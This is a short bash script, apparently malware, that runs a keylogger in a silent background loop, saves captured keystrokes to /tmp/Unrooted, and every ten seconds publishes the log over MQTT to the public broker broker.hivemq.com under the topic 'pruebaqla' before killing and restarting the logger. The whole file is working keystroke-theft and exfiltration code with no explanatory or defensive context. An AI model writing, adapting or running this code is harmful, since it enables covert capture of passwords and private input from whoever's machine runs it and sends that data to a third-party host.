#!/bin/bash

log="/tmp/Unrooted"

touch $log

while [ 0 ];

do
	python-keylogger --log-file=$log --clean-file &>/dev/null &

	pid="$(pidof /usr/bin/python /usr/bin/python-keylogger | awk '{ print $1 }')"

	sleep 10
	
	mosquitto_pub -h broker.hivemq.com -p 1883 -t pruebaqla -m "$(printf "_%s_" $(cat $log))"
	
	kill $pid
done
